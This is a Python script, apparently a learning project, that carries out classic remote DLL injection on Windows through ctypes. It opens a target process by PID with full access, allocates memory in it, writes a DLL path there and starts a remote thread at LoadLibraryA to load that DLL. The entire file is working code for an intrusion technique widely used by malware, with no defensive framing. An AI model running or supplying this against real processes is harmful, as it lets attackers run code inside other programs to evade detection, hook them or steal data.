# Remote DLL Injection, Project 1

# First, allocate remote memory in a remote process.
# Second, write a DLL location into the remote memory.
# Lastly, have the external process load that library.

from ctypes import *
from ctypes import wintypes

kernel32 = windll.kernel32
LPCTSTR = c_char_p
SIZE_T = c_size_t

OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD)
OpenProcess.restype = wintypes.HANDLE

VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.DWORD)
VirtualAllocEx.restype = wintypes.LPVOID

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = (wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, SIZE_T, POINTER(SIZE_T))
WriteProcessMemory.restype = wintypes.BOOL

GetModuleHandle = kernel32.GetModuleHandleA
GetModuleHandle.argtypes = (LPCTSTR, )
GetModuleHandle.restype = wintypes.HANDLE

GetProcAddress = kernel32.GetProcAddress
GetProcAddress.argtypes = (wintypes.HANDLE, LPCTSTR)
GetProcAddress.restype = wintypes.LPVOID

class _SECURITY_ATTIBUTES(Structure):
	_fields_ = [('nLength', wintypes.DWORD), ('lpSecurityDescriptor', wintypes.LPVOID), ('bInheritHandle', wintypes.BOOL),]

_SECURITY_ATTIBUTES = _SECURITY_ATTIBUTES
LPSECURITY_ATTRIBUTES = POINTER(_SECURITY_ATTIBUTES)
LPTHREAD_START_ROUTINE = wintypes.LPVOID

CreateRemoteThread = kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = (wintypes.HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD)
CreateRemoteThread.restype = wintypes.HANDLE

MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_READWRITE = 0x04
EXECUTE_IMMEDIATELY = 0x0
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0x00000FFF)

# Location of the file.
dll = b"C:\\Users\\antho\\Downloads\\hello_world.dll"

# We must know our process ID we want to inject to.
# Open an app like notepad and find the PID

pid = 26988 # This should be changed.

# Open a handle to that process.

handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)

if not handle:
	raise WinError()

print('Handle obtained => {0:X}'.format(handle))

# Allocate memory

remote_memory = VirtualAllocEx(handle, False, len(dll) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)

if not remote_memory:
	raise WinError()

print('Memory allocated => ', hex(remote_memory))

# Writes process memory into the newly created remote memory

write = WriteProcessMemory(handle, remote_memory, dll, len(dll) + 1, None)

if not write:
	raise WinError()

print('Bytes written => {}'.format(dll))

load_lib = GetProcAddress(GetModuleHandle(b'kernel32.dll') , b'LoadLibraryA')

print('LoadLibrary address => ', hex(load_lib))

# Start remote thread

rthread = CreateRemoteThread(handle, None, 0, load_lib, remote_memory, EXECUTE_IMMEDIATELY, None)
